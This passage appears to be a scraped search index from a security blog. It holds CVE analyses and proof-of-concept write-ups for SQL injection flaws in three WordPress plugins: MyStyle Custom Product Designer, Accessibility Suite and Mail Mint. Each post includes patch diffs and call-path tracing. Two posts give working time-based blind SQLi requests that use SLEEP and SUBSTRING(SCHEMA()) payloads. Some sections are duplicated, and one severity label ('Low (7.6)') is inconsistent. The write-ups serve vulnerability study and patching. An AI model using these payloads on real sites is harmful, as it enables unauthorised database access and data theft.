Plugin.","date":"2025-09-27","objectID":"/posts/2025-09-27-cve-2025-48281/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/posts/2025-09-27-cve-2025-48281/"},{"categories":["CVE Analysis"],"collections":null,"content":"The vulnerability exists in the MyStyle Custom Product Designer WordPress plugin prior to version 3.21.2. This can allow an attacker to interact directly with your database, including but not limited to data exfiltration. CVE ID: CVE-2025-48281 Product: WordPress MyStyle Custom Product Designer Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 3.21.1 CVSS severity: High (9.3) Required Privilege: Unauthenticated ","date":"2025-09-27","objectID":"/posts/2025-09-27-cve-2025-48281/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/posts/2025-09-27-cve-2025-48281/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. MyStyle Custom Product Designer: v3.21.1 (vulnerable) and v3.21.2 (patched) diff tool: meld or any tool that can compare two versions to see differences Activated WooCommerce plugin: WooCommerce must be active before installing the MyStyle plugin because some functions from WooCommerce are used. ","date":"2025-09-27","objectID":"/posts/2025-09-27-cve-2025-48281/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/posts/2025-09-27-cve-2025-48281/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The root cause is that the application directly injects data from a GET request into an SQL query without proper validation/control. ","date":"2025-09-27","objectID":"/posts/2025-09-27-cve-2025-48281/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/posts/2025-09-27-cve-2025-48281/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff Use any diff tool to compare the vulnerable and patched versions. A clear difference exists in the file includes/entities/class-mystyle-designmanager.php public static function get_designs( $per_page = 250, $page_number = 1, WP_User $user = null ) { global $wpdb; // Add security WHERE clause. $where = self::get_security_where_clause( 'WHERE', $user ); if ( ! empty( $_GET['orderby'] ) ) { $order = ' ORDER BY ' . sanitize_text_field( wp_unslash( $_GET['orderby'] ) ); $order .= ! empty( $_GET['order'] ) ? ' ' . sanitize_text_field( wp_unslash( $_GET['order'] ) ) : ' ASC'; } else { $order = ' ORDER BY ms_design_id DESC'; } $results = $wpdb-\u003eget_results( $wpdb-\u003eprepare( 'SELECT * ' . \"FROM {$wpdb-\u003eprefix}mystyle_designs \" . $where . $order . ' LIMIT %d OFFSET %d', array( $per_page, ( $page_number - 1 ) * $per_page, ) ), 'OBJECT' ); // other logic } Data from $_GET['orderby'] is injected directly into the SQL query without proper validation. Using only sanitize_text_field() and wp_unslash() only removes or escapes characters and does not guarantee safety. Therefore, SQLi is possible. public static function get_designs( $per_page = 250, $page_number = 1, WP_User $user = null ) { global $wpdb; // Add security WHERE clause. $where = self::get_security_where_clause( 'WHERE', $user ); if ( ! empty( $_GET['orderby'] ) ) { $orderby = sanitize_text_field( wp_unslash( $_GET['orderby'] ) ); $order = ! empty( $_GET['order'] ) ? sanitize_text_field( wp_unslash( $_GET['order'] ) ) : 'ASC'; // Validate order direction to prevent SQL injection. $allowed_orderby = array( 'ms_design_id', 'ms_title', 'ms_access', 'ms_email', 'ms_date_created', 'ms_date_modified', ); $orderby = in_array( strtolower( $orderby ), $allowed_orderby, true ) ? $orderby : 'ms_design_id'; $order = in_array( strtoupper( $order ), array( 'ASC', 'DESC' ), true ) ? $order : 'ASC'; $order = ' ORDER BY ' . $orderby . ' ' . $order; } else { $order = ' ORDER BY ms_design_id DESC'; } $results = $wpdb-\u003eget_results( $wpdb-\u003eprepare( 'SELECT * ' . \"FROM {$wpdb-\u003eprefix}mystyle_designs \" . $where . $order . ' LIMIT %d OFFSET %d', array( $per_page, ( $page_number - 1 ) * $per_page, ) ), 'OBJECT' ); // other logic } The patch implements a whitelist ($allowed_orderby) that explicitly defines allowable columns for ordering. If the orderby value is not in the allowed list, it is replaced with the default 'ms_design_id' — preventing injection of malicious payloads. Patch diff ","date":"2025-09-27","objectID":"/posts/2025-09-27-cve-2025-48281/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/posts/2025-09-27-cve-2025-48281/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How it works The vulnerability is in the get_designs function of the MyStyle_DesignManager class (file includes/entities/class-mystyle-designmanager.php). To find where it is called, search for get_designs within the plugin folder. 👉 get_designs is called from get_items, init_index_request and some test functions (not relevant). Search get_designs usage Because this is an unauthenticated vulnerability, we must identify which function can be invoked without authentication. get_items() Function get_items is in the MyStyle_Wp_Rest_Api_Design_Controller class (file includes/wprestapi/class-mystyle-wp-rest-api-design-controller.php). Search get_items The code before calling get_designs doesn’t handle authentication, so we must check the permission callback used by the REST route. get_items is registered as the callback for a REST API route using register_rest_route() in WordPress. public function register_routes() { $version = '2'; $vendor = 'wc-mystyle'; $namespace = $vendor . '/v' . $version; $base = 'designs'; register_rest_route( $namespace, '/' . $base, array( array( 'methods' =\u003e WP_REST_Server::READABLE, // GET 'callback' =\u003e array( $this, 'get_items' ), 'permission_callback' =\u003e array( $this, 'get_items_permissions_check' ), 'args' =\u003e array(), ) ) ) // other logic } However, before the callback is invoked, the get_items_permissions_check function runs — we need to know whether an anonymous user can call this API. Search for get_items_permissions_check. Search get_items_permissions_check 👉 get_items_permissions_check calls wc_rest_check_manager_permissions to verify permissions with $object = 'settings'. Because wc_rest_check_manager_permissions is defined in the WooCommerce plugin (not in this plugin), we need to inspect its behavior. Search wc_rest_check_manager_permissions wc_rest_check_manager_permissions is defined in the WooCommerce plugin. The settings mapping leads to manage_woocommerce. It calls current_user_can( 'manage_woocommerce' ) to check user capability =\u003e only admin (or users with manage_woocommerce capability). 👉 Therefore we cannot exploit via get_items =\u003e we should try to exploit via init_index_request. init_index_request() Function init_index_request is in the MyStyle_Design_Profile_Page class (file includes/pages/class-mystyle-design-profile-page.php). Search init_index_request The code prior to calling get_designs doesn’t involve authentication, so we move on. init_index_request is invoked by the init method in the same class. public function init() { // Check if the current page is /designs if ( ! self::is_current_post() ) { return; } // other logic $design_id = self::get_design_id_from_url(); // Only runs when the following POST variables are present =\u003e not relevant if( isset( $_POST['delete_design_nonce'] ) \u0026\u0026 wp_verify_nonce( sanitize_key( $_POST['delete_design_nonce'] ), 'mystyle_delete_design_nonce' ) ) { $design = MyStyle_DesignManager::get( $design_id, $user, $session ) ; if ( $design ) { // Check if the user is the owner of the design or an admin. if ( current_user_can( 'administrator' ) || MyStyle_DesignManager::is_user_design_owner( $this-\u003euser-\u003eID, $design_id ) ) { // restrict the design access to 2 (deleted). $design-\u003eset_access( 2 ); MyStyle_DesignManager::persist( $design ); $this-\u003edelete_design_success_message = 'Design has been successfully deleted.'; } } } if ( false === $design_id || preg_match( '/page/', $design_id ) ) { $design_profile_page-\u003einit_index_request(); } else { $design_profile_page-\u003einit_design_request( $design_id ); } } For init_index_request to be called, the if condition must be true. We need to know what $design_id is — it’s determined by get_design_id_from_url which is called via self::get_design_id_from_url. public static function get_design_id_from_url() { // Try the query vars ( ex: \u0026design_id=10 ). $design_id = get_query_var( 'design_id' ); if ( preg_match( '/page/', $design_id ) ) { $design_id = false; } elseif ( empty( $design_id ) ) { // ---------- try at /desig","date":"2025-09-27","objectID":"/posts/2025-09-27-cve-2025-48281/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/posts/2025-09-27-cve-2025-48281/#how-it-works"},{"categories":["CVE Analysis"],"collections":null,"content":"How it works The vulnerability is in the get_designs function of the MyStyle_DesignManager class (file includes/entities/class-mystyle-designmanager.php). To find where it is called, search for get_designs within the plugin folder. 👉 get_designs is called from get_items, init_index_request and some test functions (not relevant). Search get_designs usage Because this is an unauthenticated vulnerability, we must identify which function can be invoked without authentication. get_items() Function get_items is in the MyStyle_Wp_Rest_Api_Design_Controller class (file includes/wprestapi/class-mystyle-wp-rest-api-design-controller.php). Search get_items The code before calling get_designs doesn’t handle authentication, so we must check the permission callback used by the REST route. get_items is registered as the callback for a REST API route using register_rest_route() in WordPress. public function register_routes() { $version = '2'; $vendor = 'wc-mystyle'; $namespace = $vendor . '/v' . $version; $base = 'designs'; register_rest_route( $namespace, '/' . $base, array( array( 'methods' =\u003e WP_REST_Server::READABLE, // GET 'callback' =\u003e array( $this, 'get_items' ), 'permission_callback' =\u003e array( $this, 'get_items_permissions_check' ), 'args' =\u003e array(), ) ) ) // other logic } However, before the callback is invoked, the get_items_permissions_check function runs — we need to know whether an anonymous user can call this API. Search for get_items_permissions_check. Search get_items_permissions_check 👉 get_items_permissions_check calls wc_rest_check_manager_permissions to verify permissions with $object = 'settings'. Because wc_rest_check_manager_permissions is defined in the WooCommerce plugin (not in this plugin), we need to inspect its behavior. Search wc_rest_check_manager_permissions wc_rest_check_manager_permissions is defined in the WooCommerce plugin. The settings mapping leads to manage_woocommerce. It calls current_user_can( 'manage_woocommerce' ) to check user capability =\u003e only admin (or users with manage_woocommerce capability). 👉 Therefore we cannot exploit via get_items =\u003e we should try to exploit via init_index_request. init_index_request() Function init_index_request is in the MyStyle_Design_Profile_Page class (file includes/pages/class-mystyle-design-profile-page.php). Search init_index_request The code prior to calling get_designs doesn’t involve authentication, so we move on. init_index_request is invoked by the init method in the same class. public function init() { // Check if the current page is /designs if ( ! self::is_current_post() ) { return; } // other logic $design_id = self::get_design_id_from_url(); // Only runs when the following POST variables are present =\u003e not relevant if( isset( $_POST['delete_design_nonce'] ) \u0026\u0026 wp_verify_nonce( sanitize_key( $_POST['delete_design_nonce'] ), 'mystyle_delete_design_nonce' ) ) { $design = MyStyle_DesignManager::get( $design_id, $user, $session ) ; if ( $design ) { // Check if the user is the owner of the design or an admin. if ( current_user_can( 'administrator' ) || MyStyle_DesignManager::is_user_design_owner( $this-\u003euser-\u003eID, $design_id ) ) { // restrict the design access to 2 (deleted). $design-\u003eset_access( 2 ); MyStyle_DesignManager::persist( $design ); $this-\u003edelete_design_success_message = 'Design has been successfully deleted.'; } } } if ( false === $design_id || preg_match( '/page/', $design_id ) ) { $design_profile_page-\u003einit_index_request(); } else { $design_profile_page-\u003einit_design_request( $design_id ); } } For init_index_request to be called, the if condition must be true. We need to know what $design_id is — it’s determined by get_design_id_from_url which is called via self::get_design_id_from_url. public static function get_design_id_from_url() { // Try the query vars ( ex: \u0026design_id=10 ). $design_id = get_query_var( 'design_id' ); if ( preg_match( '/page/', $design_id ) ) { $design_id = false; } elseif ( empty( $design_id ) ) { // ---------- try at /desig","date":"2025-09-27","objectID":"/posts/2025-09-27-cve-2025-48281/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/posts/2025-09-27-cve-2025-48281/#get_items-function"},{"categories":["CVE Analysis"],"collections":null,"content":"How it works The vulnerability is in the get_designs function of the MyStyle_DesignManager class (file includes/entities/class-mystyle-designmanager.php). To find where it is called, search for get_designs within the plugin folder. 👉 get_designs is called from get_items, init_index_request and some test functions (not relevant). Search get_designs usage Because this is an unauthenticated vulnerability, we must identify which function can be invoked without authentication. get_items() Function get_items is in the MyStyle_Wp_Rest_Api_Design_Controller class (file includes/wprestapi/class-mystyle-wp-rest-api-design-controller.php). Search get_items The code before calling get_designs doesn’t handle authentication, so we must check the permission callback used by the REST route. get_items is registered as the callback for a REST API route using register_rest_route() in WordPress. public function register_routes() { $version = '2'; $vendor = 'wc-mystyle'; $namespace = $vendor . '/v' . $version; $base = 'designs'; register_rest_route( $namespace, '/' . $base, array( array( 'methods' =\u003e WP_REST_Server::READABLE, // GET 'callback' =\u003e array( $this, 'get_items' ), 'permission_callback' =\u003e array( $this, 'get_items_permissions_check' ), 'args' =\u003e array(), ) ) ) // other logic } However, before the callback is invoked, the get_items_permissions_check function runs — we need to know whether an anonymous user can call this API. Search for get_items_permissions_check. Search get_items_permissions_check 👉 get_items_permissions_check calls wc_rest_check_manager_permissions to verify permissions with $object = 'settings'. Because wc_rest_check_manager_permissions is defined in the WooCommerce plugin (not in this plugin), we need to inspect its behavior. Search wc_rest_check_manager_permissions wc_rest_check_manager_permissions is defined in the WooCommerce plugin. The settings mapping leads to manage_woocommerce. It calls current_user_can( 'manage_woocommerce' ) to check user capability =\u003e only admin (or users with manage_woocommerce capability). 👉 Therefore we cannot exploit via get_items =\u003e we should try to exploit via init_index_request. init_index_request() Function init_index_request is in the MyStyle_Design_Profile_Page class (file includes/pages/class-mystyle-design-profile-page.php). Search init_index_request The code prior to calling get_designs doesn’t involve authentication, so we move on. init_index_request is invoked by the init method in the same class. public function init() { // Check if the current page is /designs if ( ! self::is_current_post() ) { return; } // other logic $design_id = self::get_design_id_from_url(); // Only runs when the following POST variables are present =\u003e not relevant if( isset( $_POST['delete_design_nonce'] ) \u0026\u0026 wp_verify_nonce( sanitize_key( $_POST['delete_design_nonce'] ), 'mystyle_delete_design_nonce' ) ) { $design = MyStyle_DesignManager::get( $design_id, $user, $session ) ; if ( $design ) { // Check if the user is the owner of the design or an admin. if ( current_user_can( 'administrator' ) || MyStyle_DesignManager::is_user_design_owner( $this-\u003euser-\u003eID, $design_id ) ) { // restrict the design access to 2 (deleted). $design-\u003eset_access( 2 ); MyStyle_DesignManager::persist( $design ); $this-\u003edelete_design_success_message = 'Design has been successfully deleted.'; } } } if ( false === $design_id || preg_match( '/page/', $design_id ) ) { $design_profile_page-\u003einit_index_request(); } else { $design_profile_page-\u003einit_design_request( $design_id ); } } For init_index_request to be called, the if condition must be true. We need to know what $design_id is — it’s determined by get_design_id_from_url which is called via self::get_design_id_from_url. public static function get_design_id_from_url() { // Try the query vars ( ex: \u0026design_id=10 ). $design_id = get_query_var( 'design_id' ); if ( preg_match( '/page/', $design_id ) ) { $design_id = false; } elseif ( empty( $design_id ) ) { // ---------- try at /desig","date":"2025-09-27","objectID":"/posts/2025-09-27-cve-2025-48281/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/posts/2025-09-27-cve-2025-48281/#init_index_request-function"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-09-27","objectID":"/posts/2025-09-27-cve-2025-48281/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/posts/2025-09-27-cve-2025-48281/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Detect SQLi Send a GET request containing an SQLi payload. GET /designs/?orderby=(SELECT+SLEEP(5)) HTTP/1.1 Host: localhost ... Cookie: cookie_here The resulting SQL becomes: SELECT * FROM wp_mystyle_designs WHERE ms_access = 0 ORDER BY (SELECT SLEEP(5)) ASC LIMIT 25 OFFSET 0 Time-based SQLi Response 👉 Based on the response time =\u003e the payload is effective. In this case, do not append a comment after SLEEP. Because the developer has an Enter/newline that moves OFFSET to the next line; if you comment it out, the SQL parser may return an error. Debug SQL Error The chain will be split into two queries on different lines causing an error: SELECT * FROM wp_mystyle_designs WHERE ms_access = 0 ORDER BY (SELECT SLEEP(5)) -- ASC LIMIT 25 OFFSET 0 ","date":"2025-09-27","objectID":"/posts/2025-09-27-cve-2025-48281/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/posts/2025-09-27-cve-2025-48281/#detect-sqli"},{"categories":["CVE Analysis"],"collections":null,"content":"Get First Letter of Database Name A prerequisite for dumping data is being able to extract a single character of the database name — if you can get one character, you can typically dump the rest. Send a request with an SQLi payload: GET /designs/?orderby=IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1) HTTP/1.1 Host: localhost ... Cookie: cookie_here This uses SUBSTRING() to get the first character of the database name, and IF() returns SLEEP(5) if that character equals 0x77 (‘w’). Hex encoding w as 0x77 is used because orderby comes from a GET parameter that may be escaped by WordPress magic quotes. 👉 Based on the response time =\u003e the first character is w. ","date":"2025-09-27","objectID":"/posts/2025-09-27-cve-2025-48281/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/posts/2025-09-27-cve-2025-48281/#get-first-letter-of-database-name"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The CVE-2025-48281 vulnerability in the WordPress MyStyle Custom Product Designer plugin prior to version 3.21.2 stems from directly inserting user-controlled input into SQL without sufficient validation, leading to SQL Injection. The official patch implements a whitelist which ensures the input is validated and safer. Key takeaways: Strictly validate user input. Always use $wpdb-\u003eprepare() when working with the database in WordPress to avoid SQL Injection. Regularly update plugins and perform security checks to avoid becoming a target. ","date":"2025-09-27","objectID":"/posts/2025-09-27-cve-2025-48281/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/posts/2025-09-27-cve-2025-48281/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References SQL Injection cheat sheet - PortSwigger WordPress MyStyle Custom Product Designer Plugin \u003c= 3.21.1 is vulnerable to SQL Injection ","date":"2025-09-27","objectID":"/posts/2025-09-27-cve-2025-48281/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/posts/2025-09-27-cve-2025-48281/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Accessibility Suite Plugin.","date":"2025-09-26","objectID":"/posts/2025-09-26-cve-2025-32650/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/posts/2025-09-26-cve-2025-32650/"},{"categories":["CVE Analysis"],"collections":null,"content":"The vulnerability occurs in the Accessibility Suite plugin for WordPress before version 4.19. This allows an attacker to directly interact with the database, potentially stealing sensitive information. CVE ID: CVE-2025-32650 Product: WordPress Accessibility Suite Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 4.18 CVSS Severity: High (8.5) Required Privilege: Subscriber ","date":"2025-09-26","objectID":"/posts/2025-09-26-cve-2025-32650/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/posts/2025-09-26-cve-2025-32650/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Accessibility Suite: v4.18 (vulnerable) and v4.19 (patched) Diff tool: meld or any other comparison tool to spot version differences ","date":"2025-09-26","objectID":"/posts/2025-09-26-cve-2025-32650/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/posts/2025-09-26-cve-2025-32650/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The plugin failed to properly typecast user input. Although it used prepare() to prevent SQLi, the implementation was incorrect, leaving the vulnerability exploitable. ","date":"2025-09-26","objectID":"/posts/2025-09-26-cve-2025-32650/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/posts/2025-09-26-cve-2025-32650/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff Use any diff tool to compare the vulnerable and patched versions. A key difference appears in includes/classes/Helper.php. static function save_false_positive($scan_id, $issue_id){ // other logic if(! is_admin()) { return ''; } // other logic $list = json_decode( $wpdb-\u003eget_results($wpdb-\u003eprepare(\"SELECT list FROM $table_name WHERE scan_id = $scan_id\"))[0]-\u003elist // phpcs:ignore ); } The patched version passes $scan_id as a parameter to the query instead of directly concatenating it. static function save_false_positive($scan_id, $issue_id){ // other logic if(! is_admin()) { return ''; } // other logic $scan_id = absint($scan_id); // Ensure scan_id is a positive integer if (!$scan_id) { return [\"status\" =\u003e \"failed\", \"msg\" =\u003e \"Invalid scan ID\"]; } // Get list using properly prepared query $query = $wpdb-\u003eprepare( \"SELECT list FROM %i WHERE scan_id = %d\", $table_name, $scan_id ); $result = $wpdb-\u003eget_results($query); } Patch Diff ","date":"2025-09-26","objectID":"/posts/2025-09-26-cve-2025-32650/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/posts/2025-09-26-cve-2025-32650/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How it works The vulnerability resides in the static function save_false_positive of class Helper in includes/classes/Helper.php. To locate where it’s called, search for save_false_positive in the plugin directory. Search Function Call 👉 The save_false_positive function is called as a callback by the action hook wp_ajax_ONLINE_ADAv4/save_false_positive. When a POST request is sent to /wp-admin/admin-ajax.php with action=ONLINE_ADAv4/save_false_positive, the callback is executed. It requires two POST parameters: issue_id and scan_id. If they’re missing, the app returns: The function checks if the user has admin privileges; if not, it returns an empty string. if(! is_admin()) { return ''; } Then, the parameters are directly concatenated into the vulnerable SQL query. ","date":"2025-09-26","objectID":"/posts/2025-09-26-cve-2025-32650/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/posts/2025-09-26-cve-2025-32650/#how-it-works"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-09-26","objectID":"/posts/2025-09-26-cve-2025-32650/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/posts/2025-09-26-cve-2025-32650/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Detecting the SQLi Send a POST request containing an SQLi payload. Since it only requires an authenticated user with access to /wp-admin/, we can use a subscriber role — the lowest privilege in WordPress. Higher roles inherit lower privileges, so this confirms the CVE’s description. POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded; charset=UTF-8 ... Cookie: cookie_here action=ONLINE_ADAv4/save_false_positive\u0026issue_id=1\u0026scan_id=1 UNION SELECT SLEEP(5) The resulting SQL query becomes: SELECT list FROM wp_oada_false_positives WHERE scan_id = 1 UNION SELECT SLEEP(5) Time-based SQLi Response 👉 The delayed response confirms that the SQLi payload works. Alternative techniques for empty tables: UNION — works even when the base query returns no rows, but you must find the correct column count. Subquery: In WHERE clause: MySQL may optimize it away if results are predictable. In FROM clause: The subquery executes first to create a temporary table, ensuring the injected query runs. SQL Execution Order Diagram ","date":"2025-09-26","objectID":"/posts/2025-09-26-cve-2025-32650/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/posts/2025-09-26-cve-2025-32650/#detecting-the-sqli"},{"categories":["CVE Analysis"],"collections":null,"content":"Extracting the First Letter of the Database Name To fully dump data, we first confirm that SQLi allows reading at least one character from the database name. Use this payload: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded; charset=UTF-8 ... Cookie: cookie_here action=ONLINE_ADAv4/save_false_positive\u0026issue_id=1\u0026scan_id=1 UNION SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1) The query uses SUBSTRING() to extract the first character of the database name. If it equals 'w' (0x77 in hex), it triggers SLEEP(5). Since scan_id is escaped, hex encoding ensures payload integrity. 👉 Based on the delayed response — the first character is indeed w. ","date":"2025-09-26","objectID":"/posts/2025-09-26-cve-2025-32650/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/posts/2025-09-26-cve-2025-32650/#extracting-the-first-letter-of-the-database-name"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The vulnerability CVE-2025-32650 in the Accessibility Suite WordPress plugin (before version 4.19) stems from improper use of $wpdb-\u003eprepare(), leading to a SQL Injection. The official patch correctly uses $wpdb-\u003eprepare(), ensuring safe handling of user input. Key takeaways: Always use $wpdb-\u003eprepare() correctly when interacting with the WordPress database. Keep plugins updated and perform regular security audits to prevent exploitation. ","date":"2025-09-26","objectID":"/posts/2025-09-26-cve-2025-32650/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/posts/2025-09-26-cve-2025-32650/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References SQL Injection Cheat Sheet – PortSwigger WordPress Accessibility Suite Plugin \u003c= 4.18 is vulnerable to SQL Injection ","date":"2025-09-26","objectID":"/posts/2025-09-26-cve-2025-32650/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/posts/2025-09-26-cve-2025-32650/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Mail Mint Plugin.","date":"2025-09-25","objectID":"/posts/2025-09-25-cve-2025-58604/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/posts/2025-09-25-cve-2025-58604/"},{"categories":["CVE Analysis"],"collections":null,"content":"The vulnerability occurs in the Mail Mint plugin for WordPress prior to version 1.18.6. This flaw allows attackers to directly interact with the database — potentially leading to information disclosure or data theft. CVE ID: CVE-2025-58604 Product: WordPress Mail Mint Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 1.18.5 CVSS Severity: Low (7.6) Required Privilege: Administrator ","date":"2025-09-25","objectID":"/posts/2025-09-25-cve-2025-58604/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/posts/2025-09-25-cve-2025-58604/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Mail Mint: v1.18.5 (vulnerable) and v1.18.6 (patched) Diff tool: meld or any comparison tool to visualize the code difference between versions ","date":"2025-09-25","objectID":"/posts/2025-09-25-cve-2025-58604/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/posts/2025-09-25-cve-2025-58604/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The vulnerable function directly inserts user input into an SQL query without using proper sanitization or query preparation, leading to an SQL Injection vulnerability. ","date":"2025-09-25","objectID":"/posts/2025-09-25-cve-2025-58604/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/posts/2025-09-25-cve-2025-58604/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff Use any diff tool to compare the vulnerable and patched versions. There is a clear difference in the file /app/Utilities/Helper/Import.php. public static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) { // other logic global $wpdb; $total_query = \"SELECT COUNT(DISTINCT user_id) as total FROM {$wpdb-\u003eprefix}usermeta WHERE meta_key IN ('\" . implode(\"', '\", $keys) . \"')\"; $total = $wpdb-\u003eget_var($total_query); //phpcs:ignore // Final query to retrieve user IDs with limit and offset. $final_query = \"SELECT user_id FROM {$wpdb-\u003eprefix}usermeta WHERE meta_key IN ('\" . implode(\"', '\", $keys) . \"') GROUP BY user_id LIMIT $number OFFSET $offset\"; $users = $wpdb-\u003eget_results($final_query, ARRAY_A); //phpcs:ignore // other logic } The patch replaces direct string concatenation with the safer $wpdb-\u003eprepare() method. public static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) { // other logic global $wpdb; // Total query (safe with prepare) $total_query = $wpdb-\u003eprepare( \"SELECT COUNT(DISTINCT user_id) as total FROM {$wpdb-\u003eusermeta} WHERE meta_key IN ($placeholders)\", $keys ); $total = $wpdb-\u003eget_var($total_query); //phpcs:ignore // Final query with LIMIT \u0026 OFFSET (safe with prepare) $final_query = $wpdb-\u003eprepare( \"SELECT user_id FROM {$wpdb-\u003eusermeta} WHERE meta_key IN ($placeholders) GROUP BY user_id LIMIT %d OFFSET %d\", array_merge($keys, array($number, $offset)) ); $users = $wpdb-\u003eget_results($final_query, ARRAY_A); //phpcs:ignore // other logic } Patch Diff ","date":"2025-09-25","objectID":"/posts/2025-09-25-cve-2025-58604/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/posts/2025-09-25-cve-2025-58604/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How It Works The vulnerability resides in the function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) inside the Import class. To trace its usage, search for the keyword get_wp_users_by_learndash_with_limit_offset in the plugin directory. Search Import The function is called inside: retrieve_contacts_associated_with_learndash() perform_learndash_user_import() These functions belong to the ContactImportAction class in /app/API/Actions/Admin/Contact/ContactImportAction.php. Next, searching for retrieve_contacts_associated_with_learndash reveals it is used inside another method: Search 1 This function is invoked by map_contacts_with_learndash() in the ContactImportController class located in /app/API/Controllers/Admin/Contact/ContactImportController.php. Further tracing map_contacts_with_learndash shows it is registered as a REST API callback: Search 2 class ContactImportRoute extends AdminRoute { public function register_routes() { register_rest_route( $this-\u003enamespace, // mrm/v1 $this-\u003erest_base . '/learndash/map', // contacts/import/learndash/map/ array( array( 'methods' =\u003e WP_REST_Server::CREATABLE, // POST 'callback' =\u003e array( $this-\u003econtroller, 'map_contacts_with_learndash' ), 'permission_callback' =\u003e PermissionManager::current_user_can('mint_manage_contacts'), // Admin 'args' =\u003e array( 'selectedCourses' =\u003e array( 'description' =\u003e __( 'The selected courses from which to import contacts.', 'mrm' ), 'required' =\u003e true, 'type' =\u003e 'array', 'sanitize_callback' =\u003e 'rest_sanitize_array', ) ), // array + required ), ) ); // other logic } // other logic } Call flow: A POST request is made to /wp-json/mrm/v1/contacts/import/learndash/map with the required parameter selectedCourses. The callback map_contacts_with_learndash(WP_REST_Request $request) receives the request. The $request object is converted to an array $params. The callback then calls retrieve_contacts_associated_with_learndash($params). That function finally calls get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) where: $courses = $params['selectedCourses'] $keys is an array built from all value fields in $courses, concatenated like course_{COURSE_ID}_access_from. Before being inserted into the SQL query, the $keys array is merged into a string using implode(). The query 